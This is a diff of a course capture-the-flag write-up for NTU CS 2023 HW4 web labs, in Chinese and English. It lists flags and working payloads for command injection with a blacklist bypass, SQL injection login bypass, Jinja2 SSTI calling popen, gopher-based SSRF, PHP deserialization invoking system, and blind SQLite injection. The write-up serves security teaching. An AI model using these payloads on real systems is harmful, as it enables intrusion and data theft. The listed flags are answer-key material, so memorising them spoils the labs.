@@ -6,8 +6,10 @@ category: "Security/Course/NTU CS/Web"
 ---
 
 # NTU CS 2023 HW4 Write Up
+
 ## Lab-Cat Shop
 Flag: `FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}`
+
 ### 解題流程與思路
 1. 這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選
     ![圖片](https://hackmd.io/_uploads/SJ3bD8x_T.png)
@@ -19,19 +21,25 @@ Flag: `FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}`
 
 ## Lab-DNS Lookuper
 Flag: FLAG{Y0U_$(Byp4ssed)\_th3_\`waf\`}
+
 ### 解題流程與思路
 Use <font color="FF0000">**`$`** or **\`**</font> string to bypass blacklist
 Payload: 
 `'$(cat /fla*)'`
 `'`cat /fl\*g\*`'`
+
 ## Lab-Log me in
 Flag: `FLAG{b4by_sql_inj3cti0n}`
+
 ### 解題流程與思路
 * Payload → `') or ('1'='1') -- #`
 SELECT * FROM admin WHERE (username='') or ('1'='1') -- #') AND (password='MTIz')
+
 ## Lab-Jinja2 SSTI
 Flag: `FLAG{ssti.__class__.__pwn__}`
+
 ### 解題流程與思路
+
 #### Easy way
 {% raw %}
 payload: `{{[].__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("cat /th1s_15_fl4ggggggg").read()}}`
@@ -48,8 +56,10 @@ Payload:
 ```
 {% endraw %}
 ![](https://i.imgur.com/PQ39MMI.png)
+
 ## Lab-Preview Card
 Flag: `FLAG{gopher://http_post}`
+
 ### 解題流程與思路
 When you see a preview function, then it may have SSRF problem.
 1. Test it
@@ -86,8 +96,10 @@ When you see a preview function, then it may have SSRF problem.
     Payload: `gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%0d%0aContent-Length%3A%2014%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0agivemeflag%3Dyes%0d%0a`
 
 4. Then we got flag...
+
 ## Lab-Magic Cat
 Flag: `FLAG{magic_cat_pwnpwn}`
+
 ### 解題流程與思路
 1. Test payload in local side
     ```bash!
@@ -150,8 +162,10 @@ Flag: `FLAG{magic_cat_pwnpwn}`
     = "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9"
     ```
     ![](https://i.imgur.com/c5Kq7c4.png)
+
 ## HW-Double Injection - FLAG1
 Flag: `FLAG{sqlite_js0n_inject!on}`
+
 ### 解題流程與思路
 這一題超爆難，應該可以預見被splitline凌虐，先看Dockerfile寫了甚麼，安裝的前置作業結束以後，分別把FLAG1和FLAG2的內容丟到`/flag1.txt`,`/flag2-{random string}.txt`中，並且執行db的初始化，也就是把FLAG1當成admin的密碼，接著比較重要的一步是把存取db內容的file(`/etc/db.sqlite3`)的權限設定read-only，這個操作後續會說明重要的地方，最後就是執行app.js
 
@@ -229,8 +243,10 @@ Flag: `FLAG{sqlite_js0n_inject!on}`
                 AND IIF(substr(c, 1, 5) = 'FLAG{', (SELECT randomblob(1000000000 % 10) FROM sqlite_master WHERE 1 LIMIT 1), 1); -- # 
             ```
     4. 此時就可以開寫script去server端爆破FLAG1
+
 ## HW-Double Injection - FLAG2
 Flag: `FLAG{ezzzzz_sqli2ssti}`
+
 ### 解題流程與思路
 這一題想了很久，因為我沒有跟影片，想說應該都是跟去年差不多或是在臺科的網頁安全一樣，但其實相關的payload就是在講義上，花了一整天寫的我be like:
 ![](https://memeprod.ap-south-1.linodeobjects.com/user-template/7266c8627075418a7979b79481bf0f84.png)
